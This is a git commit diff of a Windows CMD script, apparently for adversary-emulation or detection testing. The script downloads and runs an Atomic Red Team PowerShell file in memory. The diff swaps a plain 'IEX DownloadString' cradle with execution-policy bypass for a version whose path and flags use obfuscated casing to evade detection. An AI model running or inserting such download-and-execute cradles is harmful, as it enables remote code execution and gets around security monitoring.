4172aeb0659bee07e5b064786550b6e4e26458cf
Feathers <93973834+ionsor@users.noreply.github.com>
2025-02-19 15:28:30 +0100

    Update run_script.cmd
    test2

--- run_script.cmd
+++ run_script.cmd
@@ -2,6 +2,5 @@
 REM This CMD script downloads and executes a remote PowerShell script in memory,
 REM then outputs a confirmation message after execution.
 
-powershell -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/5ede8f21e42ebe37e0a6eff757dba60bcfa85859/atomic/T1059.001/src/Invoke-DownloadCradle.ps1'); Write-Host 'PowerShell script executed successfully.'"
-
+c:\wIndoWs\SySWOw64\WindowSpowerSheLL\v1.0\poWershelL.EXE -NopROfiLe -execU BYpasS -cOMMANd "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/5ede8f21e42ebe37e0a6eff757dba60bcfa85859/atomic/T1059.001/src/Invoke-DownloadCradle.ps1'); Write-Host 'PowerShell script executed successfully.'"
 pause
